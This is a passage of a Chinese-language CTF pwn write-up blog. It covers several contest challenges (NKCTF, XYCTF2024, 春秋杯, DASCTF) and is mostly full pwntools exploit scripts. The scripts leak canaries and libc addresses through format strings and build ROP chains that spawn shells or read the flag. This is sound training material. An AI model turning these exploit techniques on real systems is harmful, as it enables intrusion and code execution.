class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">libc_str_values = &#123;&#125;</span><br><span class="line">libc_values = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    r.send(<span class="string">b&quot;\n&quot;</span>)  <span class="comment"># 返回sub_134F进行选择</span></span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Select a option:\n&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Input your nickname.\n&quot;</span>)</span><br><span class="line">    r.send(<span class="string">f&quot;%<span class="subst">&#123;i&#125;</span>$p\n&quot;</span>.encode())</span><br><span class="line">    libc_str_values[i] = r.recv(<span class="number">14</span>).decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc_values[i] = <span class="built_in">int</span>(libc_str_values[i], <span class="number">16</span>) <span class="keyword">if</span> libc_str_values[i].startswith(<span class="string">&#x27;0x&#x27;</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        libc_values[i] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">if</span> libc_values[i]:</span><br><span class="line">        info(<span class="string">f&quot;libc<span class="subst">&#123;i&#125;</span> value: <span class="subst">&#123;<span class="built_in">hex</span>(libc_values[i])&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        info(<span class="string">f&quot;libc<span class="subst">&#123;i&#125;</span> value: No valid address leaked&quot;</span>)</span><br></pre></td></tr></table></figure><p>判断Canary PIE libc等泄露是否正确可以gdb.attach后在pwndbg输入对应命令查看（canary pie libc vmmap等）</p><p>找__libc_start_main address: 0x29dc0 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为你的目标ELF文件的路径</span></span><br><span class="line">elf_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载ELF文件</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查__libc_start_main符号是否存在</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;__libc_start_main&#x27;</span> <span class="keyword">in</span> elf.symbols:</span><br><span class="line">    <span class="comment"># 获取__libc_start_main的地址并打印</span></span><br><span class="line">    libc_start_main_addr = elf.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;__libc_start_main address: <span class="subst">&#123;<span class="built_in">hex</span>(libc_start_main_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;__libc_start_main symbol not found in ELF.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>程序执行流程到sub_1984函数，这里看似能栈溢出，但是实则要绕过<code>v2 = __readfsqword(0x28u);</code> 和 <code>return v2 - __readfsqword(0x28u);</code>Canary代码，前两次ropchain（100个字节超过read的buf了，即使没有Canary也不行）与ret2libc都卡在这里了（即使绕过Canary后ret2libc也不能读到flag，题目没给flag权限，还是要orw才行）<br>所以任意输入返回到main函数重新进行选择</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_19EA</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  sub_1984();</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1984</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以同样的思路格式化字符串泄露Canary和栈的地址（栈地址第三位被切除，故第二个%np只要是同一页都行）</p><p>找gadgets进行orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary=libc.so<span class="number">.6</span> | grep <span class="string">&quot;ret&quot;</span></span><br><span class="line">ROPgadget --binary=libc.so<span class="number">.6</span> | grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line">ROPgadget --binary=libc.so<span class="number">.6</span> | grep <span class="string">&quot;pop rsi ; ret&quot;</span></span><br><span class="line">ROPgadget --binary=libc.so<span class="number">.6</span> | grep <span class="string">&quot;pop rdx ; pop r12 ; ret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x0000000000029139</span> : ret</span><br><span class="line"><span class="number">0x000000000002a3e5</span> : pop rdi ; ret</span><br><span class="line"><span class="number">0x000000000002be51</span> : pop rsi ; ret</span><br><span class="line"><span class="number">0x000000000011f2e7</span> : pop rdx ; pop r12 ; ret</span><br></pre></td></tr></table></figure><p>orw:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buf = stack_addr + <span class="number">3</span> <span class="comment"># 计算保存flag文件内容的缓冲区地址</span></span><br><span class="line">orw = p64(rdi_ret) + p64(buf) + p64(rsi_ret) + p64(<span class="number">0</span>) + p64(<span class="built_in">open</span>) <span class="comment"># 打开文件</span></span><br><span class="line">orw += p64(rdi_ret) + p64(<span class="number">3</span>) + p64(rsi_ret) + p64(buf - <span class="number">0x50</span>) + p64(rdx_r12) + p64(<span class="number">0x50</span>) * <span class="number">2</span> + p64(read_addr) <span class="comment"># 读取文件</span></span><br><span class="line">orw += p64(rdi_ret) + p64(<span class="number">1</span>) + p64(write_addr) <span class="comment"># 输出读取的内容</span></span><br><span class="line">payload = <span class="string">b&#x27;flag\x00&#x27;</span> <span class="comment"># 截断</span></span><br><span class="line">payload += p64(canary) + p64(<span class="number">0</span>) + orw <span class="comment"># 覆盖canary并覆盖原有的返回地址并执行orw</span></span><br></pre></td></tr></table></figure><p>最后只给一次<code>v5 == 15.0</code>使得这个判断不成立<code>if ( v1 == 2 )</code>，往v7里面写rop链执行orw</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node.nkctf.yuzhian.com.cn&#x27;</span>, <span class="number">30995</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Select a option:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input chart level and rank.&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1600000&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;SSS+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># elf 文件 __libc_start_call_main - libc 中 __libc_start_main</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Select a option:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)  <span class="comment"># break</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;%13$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_addr - <span class="number">0x29d90</span>  <span class="comment"># libc 中 __libc_start_main=0x29d90</span></span><br><span class="line">info(<span class="string">f&quot;libc base value: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Can you teach me how to play maimai?&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Select a option:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;%7$p%33p&#x27;</span>)</span><br><span class="line"><span class="comment"># Canary; Stack_addr只要是同一页都能实现</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">f&quot;Canary value: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">f&quot;Stack addr: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># orw</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line">rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">rdx_r12 = libc_base + <span class="number">0x000000000011f2e7</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">str_bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">buf = stack_addr + <span class="number">3</span></span><br><span class="line">orw = p64(rdi_ret) + p64(buf) + p64(rsi_ret) + p64(<span class="number">0</span>) + p64(<span class="built_in">open</span>)</span><br><span class="line">orw += p64(rdi_ret) + p64(<span class="number">3</span>) + p64(rsi_ret) + p64(buf - <span class="number">0x50</span>) + p64(rdx_r12) + p64(<span class="number">0x50</span>) * <span class="number">2</span> + p64(read_addr)</span><br><span class="line">orw += p64(rdi_ret) + p64(<span class="number">1</span>) + p64(write_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line">payload += p64(canary) + p64(<span class="number">0</span>) + orw</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Select&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">49</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1600000&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;SSS+&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;15.0&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="XYCTF2024"><a href="#XYCTF2024" class="headerlink" title="XYCTF2024"></a>XYCTF2024</h1><h3 id="hello-world-签到"><a href="#hello-world-签到" class="headerlink" title="hello_world(签到)"></a>hello_world(签到)</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;Linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&quot;a&quot;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;input&quot;</span>)</span><br><span class="line">p.send(padding)</span><br><span class="line">data = p.recvuntil(<span class="string">b&quot;\x0a&quot;</span>)</span><br><span class="line">libc_addr = u64(data[-<span class="number">7</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = libc_addr - <span class="number">0x29d90</span></span><br><span class="line">info(<span class="string">f&quot;libc base value: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">payload = padding + p64(rdi_ret) + p64(str_bin_sh) + p64(system)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;input&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="青少年CTF练习平台"><a href="#青少年CTF练习平台" class="headerlink" title="青少年CTF练习平台"></a>青少年CTF练习平台</h1><h3 id="简单的数学题"><a href="#简单的数学题" class="headerlink" title="简单的数学题"></a>简单的数学题</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;Linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">32694</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;x.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;8&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;sign.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;9&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;x.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;19&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="2024春秋杯网络安全联赛夏季赛"><a href="#2024春秋杯网络安全联赛夏季赛" class="headerlink" title="2024春秋杯网络安全联赛夏季赛"></a>2024春秋杯网络安全联赛夏季赛</h1><h3 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h3><p>第一次read_plt过的是csu_head的call函数，第二次read_plt进行缓冲区溢出，puts打印出bss段上的puts_got地址，然后ret2libc即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404200</span></span><br><span class="line">start = <span class="number">0x401130</span></span><br><span class="line">vuln = <span class="number">0x40125D</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004013d3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4013D1</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">csu_head = <span class="number">0x4013B0</span></span><br><span class="line">csu_rear = <span class="number">0x4013CA</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x50</span> + <span class="number">0x8</span>) + p64(vuln)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x50</span> + <span class="number">0x8</span>) + p64(vuln)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>) + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_r15) + p64(bss) + p64(<span class="number">0</span>) + p64(read_plt) + p64(csu_rear) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(bss) + p64(<span class="number">1025</span>) + p64(bss) + p64(csu_head) + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(read_plt) + p64(start)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(p64(ret))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x50</span> + <span class="number">0x8</span>) + p64(vuln)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(puts_plt) + p64(start)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libcbase &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x50</span> + <span class="number">0x8</span>) + p64(vuln)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Shuffled-Execution"><a href="#Shuffled-Execution" class="headerlink" title="Shuffled_Execution"></a>Shuffled_Execution</h3><h1 id="DASCTF2024-暑期挑战赛"><a href="#DASCTF2024-暑期挑战赛" class="headerlink" title="DASCTF2024 暑期挑战赛"></a><strong>DASCTF2024 暑期挑战赛</strong></h1><h3 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h3><p>非栈上格式化字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Please enter a keyword&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;%3$p-%6$p&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">leak1 = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = leak1 - <span class="number">0xf7360</span></span><br><span class="line">log.info(<span class="string">&quot;libc base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">leak2 = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_start_main_240 = leak2 - <span class="number">0xd8</span></span><br><span class="line">log.info(<span class="string">&quot;__libc_start_main+240:&quot;</span>+<span class="built_in">hex</span>(libc_start_main_240))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1247</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please enter a keyword&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(libc_start_main_240&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%11$hn&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please enter a keyword&#x27;</span>, <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(one_gadget &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%37$hn&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please enter a keyword&#x27;</span>, <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((libc_start_main_240 + <span class="number">2</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%11$hn&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please enter a keyword&#x27;</span>, <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span 